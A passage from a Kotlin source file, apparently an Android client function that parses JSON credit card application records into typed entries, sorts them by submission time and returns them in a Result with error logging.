                        when (val v = app.get(k)) {
                            is String, is Int, is Long, is Double, is Boolean -> dataMap[k] = v
                            else -> dataMap[k] = v.toString()
                        }
                    }
                    result.add(CreditCardApplicationEntry(
                        id           = app.optLong("id", 0L),
                        type         = app.optString("type", "unknown"),
                        data         = dataMap,
                        submittedAtMs = app.optLong("submitted_at_ms", 0L)
                    ))
                }
                Result.success(result.sortedByDescending { it.submittedAtMs })
            } catch (e: Exception) {
                Log.e(TAG, "getCreditCardApplications", e)
                Result.failure(e)
            }
        }
}
